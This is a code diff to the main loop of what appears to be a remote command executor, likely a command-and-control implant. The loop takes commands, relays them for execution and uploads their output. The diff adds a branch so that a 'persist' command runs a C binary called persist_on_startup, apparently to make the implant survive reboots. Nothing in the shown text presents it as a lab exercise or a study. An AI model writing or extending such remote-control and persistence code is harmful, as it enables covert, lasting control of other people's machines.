@@ -253,18 +253,41 @@ def main():
 				if tmp_command != command:
 					# Step 2 â€“ run the command
 					#output = execute_command(command)
-					#if command.startswith("system:"):
+					if command.startswith("persist"):
+						# Define relative paths
+						script_dir = os.path.dirname(os.path.abspath(__file__))
+						binary_path = os.path.normpath(os.path.join(script_dir, "../C/persist_on_startup"))
+						
+						try:
+						    # Execute the C binary
+						    result = subprocess.run(
+						        [binary_path], 
+						        capture_output=True, 
+						        text=True, 
+						        check=True
+						    )
+						    
+						    # Print the output from the C program
+						    print("Output:", result.stdout)
+						
+						except subprocess.CalledProcessError as e:
+						    print(f"Error running binary. Exit code: {e.returncode}")
+						    print("Error output:", e.stderr)
+						    
+						except FileNotFoundError:
+						    print(f"Binary not found at: {binary_path}")
+					else:	
 					#	command_value = command.split(":")
-					print(f"\n[Python] Sending System Command  : \"{command}\"")
-								 
-					output = send_and_receive(command)
-								 
-					print(f"[Python] Received  : \"{output}\"")
-									
-									
-									
-					print(f"[executor] System Command output: {output!r}")
-					update_result(record_uuid, output)
+						print(f"\n[Python] Sending System Command  : \"{command}\"")
+									 
+						output = send_and_receive(command)
+									 
+						print(f"[Python] Received  : \"{output}\"")
+										
+										
+										
+						print(f"[executor] System Command output: {output!r}")
+						update_result(record_uuid, output)
 				else:
 					print("Unknown command")
 
